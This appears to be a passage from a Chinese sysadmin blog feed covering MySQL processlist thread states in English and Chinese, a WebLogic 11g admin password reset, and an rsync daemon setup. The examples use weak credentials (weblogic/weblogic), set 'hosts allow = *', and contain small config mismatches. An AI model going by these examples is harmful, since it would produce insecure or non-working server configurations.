<h5 id="closing-tables"><a href="#closing-tables" class="headerlink" title="closing tables"></a>closing tables</h5><p>The thread is flushing the changed table data to disk and closing the used tables. This should be a fast operation. If not, verify that you do not have a full disk and that the disk is not in very heavy use.</p>
<p>线程正在将变更的表中的数据刷新到磁盘上并正在关闭使用过的表。这应该是一个快速的操作。如果不快，则应该检查硬盘空间是否已满或者硬盘IO是否达到瓶颈。</p>
<h5 id="converting-HEAP-to-MyISAM"><a href="#converting-HEAP-to-MyISAM" class="headerlink" title="converting HEAP to MyISAM"></a>converting HEAP to MyISAM</h5><p>The thread is converting an internal temporary table from a MEMORY table to an on-disk MyISAM table.</p>
<p>线程将一个内部临时表转换为磁盘上的MyISAM表。</p>
<h5 id="copy-to-tmp-table"><a href="#copy-to-tmp-table" class="headerlink" title="copy to tmp table"></a>copy to tmp table</h5><p>The thread is processing an ALTER TABLE statement. This state occurs after the table with the new structure has been created but before rows are copied into it.</p>
<p>线程正在处理一个ALTER TABLE语句。这个状态发生在新的表结构已经创建之后，但是在数据被复制进入之前。</p>
<h5 id="Copying-to-group-table"><a href="#Copying-to-group-table" class="headerlink" title="Copying to group table"></a>Copying to group table</h5><p>If a statement has different ORDER BY and GROUP BY criteria, the rows are sorted by group and copied to a temporary table.</p>
<p>如果一个语句有不同的ORDER BY和GROUP BY条件，数据会被复制到一个临时表中并且按组排序。</p>
<h5 id="Copying-to-tmp-table"><a href="#Copying-to-tmp-table" class="headerlink" title="Copying to tmp table"></a>Copying to tmp table</h5><p>The server is copying to a temporary table in memory.</p>
<p>线程将数据写入内存中的临时表。</p>
<h5 id="Copying-to-tmp-table-on-disk"><a href="#Copying-to-tmp-table-on-disk" class="headerlink" title="Copying to tmp table on disk"></a>Copying to tmp table on disk</h5><p>The server is copying to a temporary table on disk. The temporary result set has become too large (see Section 8.4.3.3, “How MySQL Uses Internal Temporary Tables”). Consequently, the thread is changing the temporary table from in-memory to diskbased format to save memory.</p>
<p>线程正在将数据写入磁盘中的临时表。临时表的结果集过大（大于tmp_table_size）。所以，线程将临时表由基于内存模式改为基于磁盘模式，以节省内存。</p>
<h5 id="Creating-index"><a href="#Creating-index" class="headerlink" title="Creating index"></a>Creating index</h5><p>The thread is processing ALTER TABLE … ENABLE KEYS for a MyISAM table.</p>
<p>线程正在对一个MyISAM表执行ALTER TABLE … ENABLE KEYS语句。</p>
<h5 id="Creating-sort-index"><a href="#Creating-sort-index" class="headerlink" title="Creating sort index"></a>Creating sort index</h5><p>The thread is processing a SELECT that is resolved using an internal temporary table.</p>
<p>线程正在使用内部临时表处理一个SELECT 操作。</p>
<h5 id="creating-table"><a href="#creating-table" class="headerlink" title="creating table"></a>creating table</h5><p>The thread is creating a table. This includes creation of temporary tables.</p>
<p>线程正在创建一个表，包括创建临时表。</p>
<h5 id="Creating-tmp-table"><a href="#Creating-tmp-table" class="headerlink" title="Creating tmp table"></a>Creating tmp table</h5><p>The thread is creating a temporary table in memory or on disk. If the table is created in memory but later is converted to an ondisk table, the state during that operation will be Copying to tmp table on disk.</p>
<p>线程正在创建一个临时表在内存或者磁盘上。如果这个表创建在内存上但是之后被转换到磁盘上，这个状态在运行Copying to tmp table on disk 的时候保持。</p>
<h5 id="deleting-from-main-table"><a href="#deleting-from-main-table" class="headerlink" title="deleting from main table"></a>deleting from main table</h5><p>The server is executing the first part of a multiple-table delete. It is deleting only from the first table, and saving columns and offsets to be used for deleting from the other (reference) tables.</p>
<p>线程正在执行多表删除的第一部分，只从第一个表中删除。并且保存列和偏移量用来从其他（参考）表删除。</p>
<h5 id="deleting-from-reference-tables"><a href="#deleting-from-reference-tables" class="headerlink" title="deleting from reference tables"></a>deleting from reference tables</h5><p>The server is executing the second part of a multiple-table delete and deleting the matched rows from the other tables.</p>
<p>线程正在执行多表删除的第二部分，并从其他表中删除匹配的行。</p>
<h5 id="discard-or-import-tablespace"><a href="#discard-or-import-tablespace" class="headerlink" title="discard_or_import_tablespace"></a>discard_or_import_tablespace</h5><p>The thread is processing an ALTER TABLE … DISCARD TABLESPACE or ALTER TABLE … IMPORT TABLESPACE statement.</p>
<p>线程正在执行ALTER TABLE … DISCARD TABLESPACE 或 ALTER TABLE … IMPORT TABLESPACE语句。</p>
<h5 id="end"><a href="#end" class="headerlink" title="end"></a>end</h5><p>This occurs at the end but before the cleanup of ALTER TABLE, CREATE VIEW, DELETE, INSERT, SELECT, or UPDATE statements.</p>
<p>这个状态出现在结束时，但是在对ALTER TABLE, CREATE VIEW, DELETE, INSERT, SELECT, 或者 UPDATE 语句进行清理之前。</p>
<h5 id="executing"><a href="#executing" class="headerlink" title="executing"></a>executing</h5><p>The thread has begun executing a statement.</p>
<p>该线程已开始执行一条语句。</p>
<h5 id="Execution-of-init-command"><a href="#Execution-of-init-command" class="headerlink" title="Execution of init_command"></a>Execution of init_command</h5><p>The thread is executing statements in the value of the init_command system variable.</p>
<p>线程正在执行处于init_command系统变量的值中的语句。</p>
<h5 id="freeing-items"><a href="#freeing-items" class="headerlink" title="freeing items"></a>freeing items</h5><p>The thread has executed a command. Some freeing of items done during this state involves the query cache. This state is usually followed by cleaning up.</p>
<p>线程已经执行了命令。在这个状态中涉及的查询缓存可以得到一些释放。这个状态通常后面跟随cleaning up状态。</p>
<h5 id="Flushing-tables"><a href="#Flushing-tables" class="headerlink" title="Flushing tables"></a>Flushing tables</h5><p>The thread is executing FLUSH TABLES and is waiting for all threads to close their tables.</p>
<p>线程正在执行FLUSH TABLES 并且等待所有线程关闭他们的表。</p>
<h5 id="FULLTEXT-initialization"><a href="#FULLTEXT-initialization" class="headerlink" title="FULLTEXT initialization"></a>FULLTEXT initialization</h5><p>The server is preparing to perform a natural-language full-text search.</p>
<p>服务器正在准备进行自然语言全文检索。</p>
<h5 id="init"><a href="#init" class="headerlink" title="init"></a>init</h5><p>This occurs before the initialization of ALTER TABLE, DELETE, INSERT, SELECT, or UPDATE statements. Actions taken by the server in this state include flushing the binary log, the InnoDB log, and some query cache cleanup operations.</p>
<p>For the end state, the following operations could be happening:</p>
<p>• Removing query cache entries after data in a table is changed</p>
<p>• Writing an event to the binary log</p>
<p>• Freeing memory buffers, including for blobs</p>
<p>这个状态出现在线程初始化ALTER TABLE, DELETE, INSERT, SELECT, 或 UPDATE语句之前。服务器在这种状态下进行的操作，包括：刷新全日志、Innodb日志，和一些查询缓存清理操作。</p>
<p>对于end状态，可能会发生下列操作：</p>
<p>在表中的数据变更之后移除查询缓存。</p>
<p>将事务写入全日志。</p>
<p>释放内存缓冲区，包括大的二进制数据块。</p>
<h5 id="Killed"><a href="#Killed" class="headerlink" title="Killed"></a>Killed</h5><p>Someone has sent a KILL statement to the thread and it should abort next time it checks the kill flag. The flag is checked in each major loop in MySQL, but in some cases it might still take a short time for the thread to die. If the thread is locked by some other thread, the kill takes effect as soon as the other thread releases its lock.</p>
<p>程序对线程发送了KILL语句，并且它应该放弃下一次对KILL标记的检查。这个标记在每一个MySQL的主要循环中被检查，但在某些情况下，它可能需要令线程在很短的时间内死亡。如果这个线程被其他线程锁住了，这个KILL操作会在其他线程释放锁的瞬时执行。</p>
<h5 id="Locked"><a href="#Locked" class="headerlink" title="Locked"></a>Locked</h5><p>The query is locked by another query.</p>
<p>As of MySQL 5.5.3, this state was removed because it was equivalent to the Table lock state and no longer appears in SHOW PROCESSLIST output.</p>
<p>这个查询被其他查询锁住了。</p>
<p>在MySQL 5.5.3版本，这个状态被移除了。因为它相当于表锁状态，并且不再出现在SHOW PROCESSLIST输出中。</p>
<h5 id="logging-slow-query"><a href="#logging-slow-query" class="headerlink" title="logging slow query"></a>logging slow query</h5><p>The thread is writing a statement to the slow-query log.</p>
<p>这个线程正在将语句写入慢查询日志。</p>
<h5 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h5><p>This state is used for the SHOW PROCESSLIST state.</p>
<p>没有操作的状态。</p>
<h5 id="login"><a href="#login" class="headerlink" title="login"></a>login</h5><p>The initial state for a connection thread until the client has been authenticated successfully.</p>
<p>线程连接的初始状态。直到客户端已经成功验证。</p>
<h5 id="manage-keys"><a href="#manage-keys" class="headerlink" title="manage keys"></a>manage keys</h5><p>The server is enabling or disabling a table index.</p>
<p>服务器启用或禁用表索引。</p>
<h5 id="Opening-tables-Opening-table"><a href="#Opening-tables-Opening-table" class="headerlink" title="Opening tables, Opening table"></a>Opening tables, Opening table</h5><p>The thread is trying to open a table. This is should be very fast procedure, unless something prevents opening. For example, an ALTER TABLE or a LOCK TABLE statement can prevent opening a table until the statement is finished. It is also worth checking that your table_open_cache value is large enough.</p>
<p>线程正试图打开一张表。这应该是非常快的过程，除非打开受到阻止。一个ALTER TABLE 或LOCK TABLE语句能够阻止打开一张表直到语句运行结束。有必要检查table_open_cache的值是否足够大。</p>
<h5 id="optimizing"><a href="#optimizing" class="headerlink" title="optimizing"></a>optimizing</h5><p>The server is performing initial optimizations for a query.</p>
<p>服务器执行查询的初步优化。</p>
<h5 id="preparing"><a href="#preparing" class="headerlink" title="preparing"></a>preparing</h5><p>This state occurs during query optimization.</p>
<p>在查询优化过程中出现这个状态。</p>
<h5 id="Purging-old-relay-logs"><a href="#Purging-old-relay-logs" class="headerlink" title="Purging old relay logs"></a>Purging old relay logs</h5><p>The thread is removing unneeded relay log files.</p>
<p>线程正在移除不必要的中继日志文件。</p>
<h5 id="query-end"><a href="#query-end" class="headerlink" title="query end"></a>query end</h5><p>This state occurs after processing a query but before the freeing items state.</p>
<p>这个状态出现在处理一个查询之后，但是在freeing items状态之前。</p>
<h5 id="Reading-from-net"><a href="#Reading-from-net" class="headerlink" title="Reading from net"></a>Reading from net</h5><p>The server is reading a packet from the network.</p>
<p>服务器正在从网络阅读数据包。</p>
<h5 id="Removing-duplicates"><a href="#Removing-duplicates" class="headerlink" title="Removing duplicates"></a>Removing duplicates</h5><p>The query was using SELECT DISTINCT in such a way that MySQL could not optimize away the distinct operation at an early stage. Because of this, MySQL requires an extra stage to remove all duplicated rows before sending the result to the client.</p>
<p>查询正在使用SELECT DISTINCT，这种情况下MySQL不能在早期阶段优化掉一些distinct操作。因此，MySQL需要一个额外的阶段，在将结果发送到客户端之前删除所有重复的行。</p>
<h5 id="removing-tmp-table"><a href="#removing-tmp-table" class="headerlink" title="removing tmp table"></a>removing tmp table</h5><p>The thread is removing an internal temporary table after processing a SELECT statement. This state is not used if no temporary table was created.</p>
<p>线程正在移除一个内置临时表，在执行一条SELECT语句之后。 如果没有临时表产生，那么这个状态不被使用。</p>
<h5 id="rename"><a href="#rename" class="headerlink" title="rename"></a>rename</h5><p>The thread is renaming a table.</p>
<p>线程正在重命名一张表。</p>
<h5 id="rename-result-table"><a href="#rename-result-table" class="headerlink" title="rename result table"></a>rename result table</h5><p>The thread is processing an ALTER TABLE statement, has created the new table, and is renaming it to replace the original table.</p>
<p>线程正在处理ALTER TABLE语句，创建新的表，并且重命名它来代替原有的表。</p>
<h5 id="Reopen-tables"><a href="#Reopen-tables" class="headerlink" title="Reopen tables"></a>Reopen tables</h5><p>The thread got a lock for the table, but noticed after getting the lock that the underlying table structure changed. It has freed the lock, closed the table, and is trying to reopen it.</p>
<p>线程获得了表锁，但是在取得表锁之后才发现该表的底层结构已经发生了变化。线程释放这个锁，关闭表，并试图重新打开该表。</p>
<h5 id="Repair-by-sorting"><a href="#Repair-by-sorting" class="headerlink" title="Repair by sorting"></a>Repair by sorting</h5><p>The repair code is using a sort to create indexes.</p>
<p>修复代码正在使用一个分类来创建索引。</p>
<h5 id="Repair-done"><a href="#Repair-done" class="headerlink" title="Repair done"></a>Repair done</h5><p>The thread has completed a multi-threaded repair for a MyISAM table.</p>
<p>线程完成一个多线程的MyISAM表的修复。</p>
<h5 id="Repair-with-keycache"><a href="#Repair-with-keycache" class="headerlink" title="Repair with keycache"></a>Repair with keycache</h5><p>The repair code is using creating keys one by one through the key cache. This is much slower than Repair by sorting.</p>
<p>修复代码正在通过索引缓存一个接一个地使用创建索引。这比通过分类修复要慢很多。</p>
<h5 id="Rolling-back"><a href="#Rolling-back" class="headerlink" title="Rolling back"></a>Rolling back</h5><p>The thread is rolling back a transaction.</p>
<p>线程正在回滚一个事务</p>
<h5 id="Saving-state"><a href="#Saving-state" class="headerlink" title="Saving state"></a>Saving state</h5><p>For MyISAM table operations such as repair or analysis, the thread is saving the new table state to the .MYI file header. State includes information such as number of rows, the AUTO_INCREMENT counter, and key distributions.</p>
<p>对于MyISAM表的类似repair或analysis操作，线程在.MYI文件的头部保存一个新表的状态。状态信息包括行数、自增数、索引分布等等。</p>
<h5 id="Searching-rows-for-update"><a href="#Searching-rows-for-update" class="headerlink" title="Searching rows for update"></a>Searching rows for update</h5><p>The thread is doing a first phase to find all matching rows before updating them. This has to be done if the UPDATE is changing the index that is used to find the involved rows.</p>
<p>线程正在进行第一阶段，在更新前寻找所有匹配的行。如果update正在更改用于查找相关行的索引，则必须这么做。</p>
<h5 id="Sending-data"><a href="#Sending-data" class="headerlink" title="Sending data"></a>Sending data</h5><p>The thread is reading and processing rows for a SELECT statement, and sending data to the client. Because operations occurring during this this state tend to perform large amounts of disk access (reads), it is often the longest-running state over the lifetime of a given query.</p>
<p>线程正在读取和处理一条SELECT语句的行，并且将数据发送至客户端。由于在此期间会执行大量的磁盘访问（读操作），这个状态在一个指定查询的生命周期中经常是耗时最长的。</p>
<h5 id="setup"><a href="#setup" class="headerlink" title="setup"></a>setup</h5><p>The thread is beginning an ALTER TABLE operation.</p>
<p>线程正开始进行一个ALTER TABLE操作。</p>
<h5 id="Sorting-for-group"><a href="#Sorting-for-group" class="headerlink" title="Sorting for group"></a>Sorting for group</h5><p>The thread is doing a sort to satisfy a GROUP BY.</p>
<p>线程正在执行一个由GROUP BY指定的排序。</p>
<h5 id="Sorting-for-order"><a href="#Sorting-for-order" class="headerlink" title="Sorting for order"></a>Sorting for order</h5><p>The thread is doing a sort to satisfy a ORDER BY.</p>
<p>线程正在执行一个由ORDER BY指定的排序。</p>
<h5 id="Sorting-index"><a href="#Sorting-index" class="headerlink" title="Sorting index"></a>Sorting index</h5><p>The thread is sorting index pages for more efficient access during a MyISAM table optimization operation.</p>
<p>线程正在对索引页进行排序，为了对MyISAM表进行操作时获得更优的性能。</p>
<h5 id="Sorting-result"><a href="#Sorting-result" class="headerlink" title="Sorting result"></a>Sorting result</h5><p>For a SELECT statement, this is similar to Creating sort index, but for nontemporary tables.</p>
<p>对于一个SELECT语句，这与创建排序索引相似，但是是对非临时表。</p>
<h5 id="statistics"><a href="#statistics" class="headerlink" title="statistics"></a>statistics</h5><p>The server is calculating statistics to develop a query execution plan. If a thread is in this state for a long time, the server is probably disk-bound performing other work.</p>
<p>服务器计算统计去规划一个查询。如果一个线程长时间处于这个状态，这个服务器的磁盘可能在执行其他工作。</p>
<h5 id="System-lock"><a href="#System-lock" class="headerlink" title="System lock"></a>System lock</h5><p>The thread is going to request or is waiting for an internal or external system lock for the table. If this state is being caused by requests for external locks and you are not using multiple mysqld servers that are accessing the same MyISAM tables, you can disable external system locks with the –skip-external-locking option. However, external locking is disabled by default, so it is likely that this option will have no effect. For SHOW PROFILE, this state means the thread is requesting the lock</p>
<p>(not waiting for it).</p>
<p>这个线程正在请求或者等待一个内部的或外部的系统表锁。如果这个状态是由于外部锁的请求产生的，并且你没有使用多个正在访问相同的表的mysqld服务器，那么你可以使用–skip-external-locking选项禁用外部系统锁。然而，外部系统锁默认情况下禁用，因此这个选项可能不会产生效果。对于SHOW PROFILE，这个状态意味着线程正在请求锁。（而非等待）</p>
<h5 id="Table-lock"><a href="#Table-lock" class="headerlink" title="Table lock"></a>Table lock</h5><p>The next thread state after System lock. The thread has acquired an external lock and is going to request an internal table lock.</p>
<p>This state was replaced in MySQL 5.5.6 with Waiting for table level lock.</p>
<p>系统锁定后的下一个线程状态。线程已获得外部锁并且将请求内部表锁。</p>
<p>这个状态在MySQL 5.5.6版本中被Waiting for table level lock取代。</p>
<h5 id="Updating"><a href="#Updating" class="headerlink" title="Updating"></a>Updating</h5><p>The thread is searching for rows to update and is updating them.</p>
<p>线程寻找更新匹配的行并进行更新。</p>
<h5 id="updating-main-table"><a href="#updating-main-table" class="headerlink" title="updating main table"></a>updating main table</h5><p>The server is executing the first part of a multiple-table update. It is updating only the first table, and saving columns and offsets to be used for updating the other (reference) tables.</p>
<p>线程正在执行多表更新的第一部分，只从第一个表中更新。并且保存列和偏移量用来从其他（参考）表更新。</p>
<h5 id="updating-reference-tables"><a href="#updating-reference-tables" class="headerlink" title="updating reference tables"></a>updating reference tables</h5><p>The server is executing the second part of a multiple-table update and updating the matched rows from the other tables.</p>
<p>线程正在执行多表更新的第二部分，并从其他表中更新匹配的行。</p>
<h5 id="User-lock"><a href="#User-lock" class="headerlink" title="User lock"></a>User lock</h5><p>The thread is going to request or is waiting for an advisory lock requested with a GET_LOCK() call. For SHOW PROFILE, this state means the thread is requesting the lock (not waiting for it).</p>
<p>线程正在请求或等待一个GET_LOCK()调用所要求的咨询锁。对于SHOW PROFILE，这个状态意味这线程正在请求锁。（而非等待）</p>
<h5 id="User-sleep"><a href="#User-sleep" class="headerlink" title="User sleep"></a>User sleep</h5><p>The thread has invoked a SLEEP() call.</p>
<p>线程调用了一个SLEEP()。</p>
<h5 id="Waiting-for-all-running-commits-to-finish"><a href="#Waiting-for-all-running-commits-to-finish" class="headerlink" title="Waiting for all running commits to finish"></a>Waiting for all running commits to finish</h5><p>A statement that causes an explicit or implicit commit is waiting for release of a read lock. This state was removed in MySQL 5.5.8; Waiting for commit lock is used instead.</p>
<p>一个显式或隐式语句在提交时等待释放读锁。这个状态在MySQL 5.5.8版本中被移除，以Waiting for commit lock代替。</p>
<h5 id="Waiting-for-commit-lock"><a href="#Waiting-for-commit-lock" class="headerlink" title="Waiting for commit lock"></a>Waiting for commit lock</h5><p>A statement that causes an explicit or implicit commit is waiting for release of a read lock or FLUSH TABLES WITH READ LOCK) is waiting for a commit lock. This state was added in MySQL 5.5.8.</p>
<p>同上，这个状态于MySQL 5.5.8版本加入。</p>
<h5 id="Waiting-for-global-read-lock"><a href="#Waiting-for-global-read-lock" class="headerlink" title="Waiting for global read lock"></a>Waiting for global read lock</h5><p>FLUSH TABLES WITH READ LOCK) is waiting for a global read lock.</p>
<p>等待全局读锁。</p>
<h5 id="Waiting-for-release-of-readlock"><a href="#Waiting-for-release-of-readlock" class="headerlink" title="Waiting for release of readlock"></a>Waiting for release of readlock</h5><p>The thread is waiting for a global read lock obtained by another thread (with FLUSH TABLES WITH READ LOCK) to be released.This state was removed in MySQL 5.5.8; Waiting for global read lock or Waiting for commit lock are used instead.</p>
<p>等待释放读锁。</p>
<h5 id="Waiting-for-tables-Waiting-for-table-Waiting-for-table-flush"><a href="#Waiting-for-tables-Waiting-for-table-Waiting-for-table-flush" class="headerlink" title="Waiting for tables, Waiting for table, Waiting for table flush"></a>Waiting for tables, Waiting for table, Waiting for table flush</h5><p>The thread got a notification that the underlying structure for a table has changed and it needs to reopen the table to get the new structure. However, to reopen the table, it must wait until all other threads have closed the table in question.</p>
<p>This notification takes place if another thread has used FLUSH TABLES or one of the following statements on the table in question: FLUSH TABLES _tbl<em>name</em>, ALTER TABLE, RENAME TABLE, REPAIR TABLE, ANALYZE TABLE, or OPTIMIZE TABLE.</p>
<p>In MySQL 5.5.6, Waiting for table was replaced with Waiting for table flush.</p>
<p>线程获得一个通知，底层表结构已经发生变化，它需要重新打开表来获取新的结构。然而，重新打开表，它必须等到所有其他线程关闭这个有问题的表。</p>
<p>这个通知产生通常因为另一个线程对问题表执行了FLUSH TABLES或者以下语句之一：FLUSH TABLES _tbl<em>name</em>, ALTER TABLE, RENAME TABLE, REPAIR TABLE, ANALYZE TABLE, or OPTIMIZE TABLE.</p>
<h5 id="Waiting-for-lock-type-lock"><a href="#Waiting-for-lock-type-lock" class="headerlink" title="Waiting for _lock_type _lock"></a>Waiting for _lock_type _lock</h5><p>The server is waiting to acquire a lock, where _lock_type _indicates the type of lock:</p>
<p>• Waiting for event metadata lock (added in MySQL 5.5.8)</p>
<p>• Waiting for global metadata lock (replaced by Waiting for global read lock in MySQL 5.5.8)</p>
<p>• Waiting for global read lock (added in MySQL 5.5.8)</p>
<p>• Waiting for schema metadata lock</p>
<p>• Waiting for stored function metadata lock</p>
<p>• Waiting for stored procedure metadata lock</p>
<p>• Waiting for table level lock</p>
<p>• Waiting for table metadata lock</p>
<p>• Waiting for trigger metadata lock (added in MySQL 5.5.8)</p>
<p>等待各个种类的表锁。</p>
<h5 id="Waiting-on-cond"><a href="#Waiting-on-cond" class="headerlink" title="Waiting on cond"></a>Waiting on cond</h5><p>A generic state in which the thread is waiting for a condition to become true. No specific state information is available.</p>
<p>一个普通的状态，线程正在等待一个条件为真。没有特定的状态信息可用。</p>
<h5 id="Waiting-to-get-readlock"><a href="#Waiting-to-get-readlock" class="headerlink" title="Waiting to get readlock"></a>Waiting to get readlock</h5><p>The thread has issued a FLUSH TABLES WITH READ LOCK statement to obtain a global read lock and is waiting to obtain the lock. This state was removed in MySQL 5.5.8; Waiting for global read lock is used instead.</p>
<p>线程发出了一个FLUSH TABLES WITH READ LOCK语句来获取一个全局读锁，并且等待获得这个锁。这个状态在MySQL 5.5.8被移除，使用Waiting for global read lock 来代替。</p>
<h5 id="Writing-to-net"><a href="#Writing-to-net" class="headerlink" title="Writing to net"></a>Writing to net</h5><p>The server is writing a packet to the network.</p>
<p>服务器正在写一个网络数据包。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> processlist状态 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WebLogic 11g重置用户密码过程]]></title>
      <url>/2012/08/11/weblogic-11g-e9-87-8d-e7-bd-ae-e7-94-a8-e6-88-b7-e5-af-86-e7-a0-81-e8-bf-87-e7-a8-8b.html</url>
      <content type="html"><![CDATA[<p>&#160;&#160;&#160;&#160; 刚接手了weblogic环境，对它并不熟悉，又加上之前被辞的人品极为差劲的所谓项目经理没有任何文档，苦不堪言！只好自己寻求解决之道！</p>
<p>首先为了保证数据的安全，要先备份原来的配置文件</p>
<p>$DOMAIN_HOME=/wls/Oracle/Middleware/user_projects/domains/base_domain/</p>
<p>1.为了保证操作安全，备份$DOMAIN_HOME/security/DefaultAuthenticatorInit.ldift </p>
<p>2. 进入$DOMAIN_HOME/security目录，执行下列命令： </p>
<p>/wls/Oracle/Middleware/user_projects/domains/base_domain/security</p>
<p>java&#160; -classpath /wls/Oracle/Middleware/wlserver_10.3/server/lib/weblogic.jar&#160; weblogic.security.utils.AdminAccount&#160; weblogic&#160; weblogic&#160; .</p>
<p><u>特别注意命令结尾是空格和一个点号！</u></p>
<p>此命令将生成新的DefaultAuthenticatorInit.ldift文件覆盖原来的</p>
<p><u></u></p>
<p>3. 进入管理服务器的AdminServer目录，如：$DOMAIN_HOME/servers/AdminServer。将其中的data目录重命名，如：data_old。或者备份到别的地方</p>
<p>&#160;</p>
<p>4. 修改管理服务器的boot.properties文件; </p>
<p>如：$DOMAIN_HOME/servers/AdminServer/security /boot.properties，修改其中的用户名与密码（用明文，第一次启动服务器时明文将被加密），要和上面命令<br>中的用户名密码一致。<br>例：修改后：<br>username=weblogic<br>password=weblogic</p>
<p>&#160;</p>
<p>5. 重新启动服务器后，就可以使用用户weblogic登录管理控制台了</p>
<p>第一次启动后，$DOMAIN_HOME/servers/AdminServer/security/boot.properties中的用户名密码被加密为： </p>
<p>password={AES}eCAESwlBym9A6ZI6HMOSf1ACl85BwDDouZ2+FaamP1s=<br>username={AES}YVuNv07/Yi3EjhDUoUjWl/S1jUDamfLpm9/iXAb3gto=</p>
<p>&#160;</p>
<p>WebLogic管理控制台访问地址：</p>
<p><a href="http://192.168.1.10:7001/console/login/LoginForm.jsp" title="http://192.168.1.108:7001/console/login/LoginForm.jsp" target="_blank" rel="external">http://192.168.1.10:7001/console/login/LoginForm.jsp</a></p>
<p>&#160;</p>
<p>有时间会继续补充WebLogic的知识，虽说过程并不难，但能提炼到遇到新生的问题，高效的解决才是最重要的；所以我会坚持将遇到的问题详细记录！</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> weblogic </tag>
            
            <tag> 中间件 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Rsync+inotify数据同步及常见的问题]]></title>
      <url>/2012/08/09/rsyncinotify-e6-95-b0-e6-8d-ae-e5-90-8c-e6-ad-a5-e5-8f-8a-e5-b8-b8-e8-a7-81-e7-9a-84-e9-97-ae-e9-a2-98.html</url>
      <content type="html"><![CDATA[<p>今天在两台服务器同步备份在用户权限上纠结了很多，主要关于这个问题网上的配置方法不一，源自rsync版本不一致。</p>
<p><a href="http://blog.lixiphp.com/wp-content/uploads/2011/10/rsync.jpg" target="_blank" rel="external"><img src="http://blog.lixiphp.com/wp-content/uploads/2011/10/rsync_thumb.jpg" alt="rsync同步备份服务器配置" title="rsync同步备份服务器配置"></a></p>
<h6 id="Rsync-版本"><a href="#Rsync-版本" class="headerlink" title="Rsync 版本"></a>Rsync 版本</h6><p>[root@mail video]# rsync –version<br>rsync&#160; version 3.0.6&#160; protocol version 30<br>Copyright (C) 1996-2009 by Andrew Tridgell, Wayne Davison, and others.<br>Web site: rsync.samba.org<br>Capabilities:<br>&#160;&#160;&#160; 64-bit files, 64-bit inums, 64-bit timestamps, 64-bit long ints,<br>&#160;&#160;&#160; socketpairs, hardlinks, symlinks, IPv6, batchfiles, inplace,<br>&#160;&#160;&#160; append, ACLs, xattrs, iconv, no symtimes</p>
<p>rsync comes with ABSOLUTELY NO WARRANTY.&#160; This is free software, and you<br>are welcome to redistribute it under certain conditions.&#160; See the GNU<br>General Public Licence for details.</p>
<h6 id="服务器同步任务需求"><a href="#服务器同步任务需求" class="headerlink" title="服务器同步任务需求"></a>服务器同步任务需求</h6><ul>
<li>服务器A与服务器B同步备份，这里只说明服务器A同步到服务器B，服务器B还原到服务器A。<em>   考虑安全因素，使用普通用户进行同步。</em>   使用cronjob，定时同步。  </li>
</ul>
<h6 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h6><p>错误发生在rsync 3.0.6版本，64位 CentOS5.5 系统。</p>
<p>首页这篇文章主要解决的错误是以下：</p>
<blockquote>
<p>@ERROR: auth failed on module <em>*</em><br>rsync error: error starting client-server protocol (code 5) at main.c(1503) [receiver=3.0.6]  </p>
</blockquote>
<p><em>*</em> 是你/etc/rsyncd.conf 中配置的模块，我这里用</p>
<blockquote>
<p>password file must not be other-accessible<br>continuing without password file<br>Password:<br>@ERROR: auth failed on module <em>*</em><br>rsync error: error starting client-server protocol (code 5) at main.c(1503) [receiver=3.0.6]  </p>
</blockquote>
<h6 id="Rsync-配置"><a href="#Rsync-配置" class="headerlink" title="Rsync 配置"></a>Rsync 配置</h6><p>#vi /etc/rsyncd.conf</p>
<blockquote>
<p>uid = nobody<br>gid = nobody<br>max connections = 4<br>read only = true       </p>
<p>#hosts allow = 202.207.177.180<br>hosts allow = *<br>transfer logging = true<br>log format = %h %o %f %l %b<br>log file = /var/log/rsyncd.log<br>slp refresh = 300<br>log file = /var/log/rsyncd.log<br>pid file = /var/run/rsyncd.pid<br>lock file = /var/run/rsyncd.lock</p>
<p>[web]<br>path = /home/admin/public_html<br>comment = Mirror to Hk server<br>read only = true<br>list = false<br>auth users = lixiphp</p>
<p>[test]<br>path = /home/admin/domains/test<br>read only = false<br>auth users = lixiphp<br>secrets file = /etc/rsyncd.secrets  </p>
</blockquote>
<h6 id="配置普通用户密码"><a href="#配置普通用户密码" class="headerlink" title="配置普通用户密码"></a>配置普通用户密码</h6><blockquote>
<p>[root@mail video]# vi /etc/rsyncd.secrets  </p>
</blockquote>
<p>格式为： username:password</p>
<blockquote>
<p>rsync_user:rsyncofpass  </p>
</blockquote>
<p>设置权限为只读：</p>
<blockquote>
<p>chmod 600 /etc/rsyncd.secrets  </p>
</blockquote>
<h6 id="首次启动rsync"><a href="#首次启动rsync" class="headerlink" title="首次启动rsync"></a>首次启动rsync</h6><blockquote>
<p>rsync –daemon –config=/etc/rsyncd.conf  </p>
</blockquote>
<p>如果提示</p>
<blockquote>
<p>failed to create pid file /var/run/rsyncd.pid: File exists  </p>
</blockquote>
<p>使用指令</p>
<blockquote>
<p>rm -rf /var/run/rsyncd.pid  </p>
</blockquote>
<h6 id="重启已经在运行的rsync"><a href="#重启已经在运行的rsync" class="headerlink" title="重启已经在运行的rsync"></a>重启已经在运行的rsync</h6><blockquote>
<p>[root@mail video]# ps -ef | grep rsync<br>root&#160;&#160;&#160;&#160; 27284&#160;&#160;&#160;&#160; 1&#160; 0 10:26 ?&#160;&#160;&#160;&#160;&#160;&#160;&#160; 00:00:00 rsync –daemon –config=/etc/rsyncd.conf<br>root&#160;&#160;&#160;&#160; 30516 29986&#160; 0 18:35 pts/3&#160;&#160;&#160; 00:00:00 grep rsync<br>[root@mail video]# kill -9 27284<br>[root@mail video]# rsync –daemon –config=/etc/rsyncd.conf  </p>
</blockquote>
<p>这样服务器A配置成功！</p>
<h5 id="服务器B配置"><a href="#服务器B配置" class="headerlink" title="服务器B配置"></a>服务器B配置</h5><p>一般错误都会发生在服务器B，注意这部分的讲解！</p>
<p>通过CentOS yum install rsync，安装rsync服务。</p>
<p>在rsync安装之后，运行以下指令同步备份：</p>
<blockquote>
<p>rsync -vzrtopg –progress –delete –password-file=/home/admin/admin_backups/password.rsync rsync://lixiphp@203.171.237.245/test&#160; /home/admin/admin_backups/test  </p>
</blockquote>
